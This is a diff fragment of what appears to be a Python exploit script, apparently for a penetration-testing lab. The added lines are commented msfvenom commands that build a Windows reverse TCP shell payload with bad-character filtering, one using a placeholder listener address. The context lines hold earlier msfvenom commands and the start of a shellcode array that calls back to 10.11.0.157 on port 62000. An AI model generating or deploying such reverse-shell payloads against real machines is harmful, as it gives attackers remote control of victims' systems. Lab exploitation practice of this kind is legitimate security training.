@@ -44,6 +44,14 @@ print '#######################################################################\n
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
 
+# D4nk0St0rM
+# msfvenom -p windows/shell_reverse_tcp LHOST=MI_IP LPORT=813 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
+# # -p windows/shell_reverse_tcp  # unstaged nc'able shell
+# -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40"  # comments in the python code.
+# -v shell # variable shell
+# -a x86 --platform windows # winbox 
+# / D4nk0St0rM
+
 # Reverse TCP to 10.11.0.157 port 62000:
 shellcode=(
 "\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
